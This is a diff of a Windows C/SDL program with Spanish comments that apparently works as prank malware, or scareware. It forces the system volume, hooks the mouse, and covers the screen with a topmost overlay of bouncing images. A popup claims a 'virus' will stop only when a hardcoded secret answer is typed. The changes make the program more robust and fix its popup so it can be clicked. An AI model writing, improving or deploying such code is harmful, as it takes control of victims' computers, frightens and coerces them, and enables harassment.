@@ -19,9 +19,9 @@
 #define IMG_W       150
 #define IMG_H       150
 #define MAX_IMAGES  20
-#define SECRET_ANSWER "gato"
+#define SECRET_ANSWER "vinicius"
 
-// ── Volumen máximo del sistema ────────────────────────────────────────────────
+// ── Volumen del sistema ───────────────────────────────────────────────────────
 DWORD WINAPI volumeWatcherThread(LPVOID lpParam) {
     CoInitialize(NULL);
 
@@ -29,17 +29,22 @@ DWORD WINAPI volumeWatcherThread(LPVOID lpParam) {
     IMMDevice *pDevice = NULL;
     IAudioEndpointVolume *pVolume = NULL;
 
-    CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL,
-                     &IID_IMMDeviceEnumerator, (void**)&pEnum);
+    HRESULT hr;
 
-    pEnum->lpVtbl->GetDefaultAudioEndpoint(pEnum, eRender, eConsole, &pDevice);
-    pDevice->lpVtbl->Activate(pDevice, &IID_IAudioEndpointVolume,
+    hr = CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL,
+                     &IID_IMMDeviceEnumerator, (void**)&pEnum);
+    if (FAILED(hr) || !pEnum) { CoUninitialize(); return 1; }
+
+    hr = pEnum->lpVtbl->GetDefaultAudioEndpoint(pEnum, eRender, eConsole, &pDevice);
+    if (FAILED(hr) || !pDevice) { pEnum->lpVtbl->Release(pEnum); CoUninitialize(); return 1; }
+
+    hr = pDevice->lpVtbl->Activate(pDevice, &IID_IAudioEndpointVolume,
                                CLSCTX_ALL, NULL, (void**)&pVolume);
+    if (FAILED(hr) || !pVolume) { pDevice->lpVtbl->Release(pDevice); pEnum->lpVtbl->Release(pEnum); CoUninitialize(); return 1; }
 
     while (1) {
         pVolume->lpVtbl->SetMasterVolumeLevelScalar(pVolume, 0.05f, NULL);
         pVolume->lpVtbl->SetMute(pVolume, FALSE, NULL);
-        printf("Volumen fijado\n");
         Sleep(200);
     }
 
@@ -109,8 +114,8 @@ void drawPopup(SDL_Renderer *r, TTF_Font *f, Popup *p) {
     SDL_Color red   = {200,0,0,255};
     SDL_Color gray  = {100,100,100,255};
 
-    drawText(r, f, "¿Cual es el animal favorito?", bx+70, by+20, black);
-    drawText(r, f, "Responde correctamente para continuar.", bx+30, by+55, gray);
+    drawText(r, f, "¿Cual es el mejor del mundo?", bx+70, by+20, black);
+    drawText(r, f, "Responde correctamente para parar el virus.", bx+30, by+55, gray);
 
     SDL_Rect inp = {bx+20, by+95, 400, 38};
     SDL_SetRenderDrawColor(r, 255,255,255,255);
@@ -133,7 +138,6 @@ void drawPopup(SDL_Renderer *r, TTF_Font *f, Popup *p) {
 int main(void) {
     srand((unsigned)time(NULL));
 
-    // Lanzar hilo de volumen máximo
     CreateThread(NULL, 0, volumeWatcherThread, NULL, 0, NULL);
 
     g_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
@@ -157,9 +161,10 @@ int main(void) {
     SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, SCREEN_W, SCREEN_H,
                  SWP_NOMOVE | SWP_NOSIZE);
 
+    // ── Color clave: negro casi puro (1,1,1) para que el fondo sea transparente
     SetWindowLong(hwnd, GWL_EXSTYLE,
         GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED | WS_EX_TRANSPARENT);
-    SetLayeredWindowAttributes(hwnd, RGB(0,0,0), 0, LWA_COLORKEY);
+    SetLayeredWindowAttributes(hwnd, RGB(1,1,1), 0, LWA_COLORKEY);
 
     SDL_Renderer *ren = SDL_CreateRenderer(win, -1,
         SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);
@@ -228,8 +233,12 @@ int main(void) {
                     popup.input[0] = '\0';
                     popup.wrong = false;
 
+                    // ── Quitar transparencia para que el popup sea clickeable ──
                     SetWindowLong(hwnd, GWL_EXSTYLE,
                         GetWindowLong(hwnd, GWL_EXSTYLE) & ~WS_EX_TRANSPARENT);
+
+                    // ── Quitar color clave para que el fondo opaco se vea ─────
+                    SetLayeredWindowAttributes(hwnd, 0, 255, LWA_ALPHA);
                 }
 
                 if (popup.visible) {
@@ -272,7 +281,12 @@ int main(void) {
                 imgs[i].vy *= -1;
         }
 
-        SDL_SetRenderDrawColor(ren, 0,0,0,255);
+        // ── Fondo: (1,1,1) = transparente, no negro puro ─────────────────
+        if (popup.visible)
+            SDL_SetRenderDrawColor(ren, 30, 30, 30, 255); // fondo oscuro visible
+        else
+            SDL_SetRenderDrawColor(ren, 1, 1, 1, 255);    // transparente
+
         SDL_RenderClear(ren);
 
         for (int i = 0; i < imgCount; i++) {
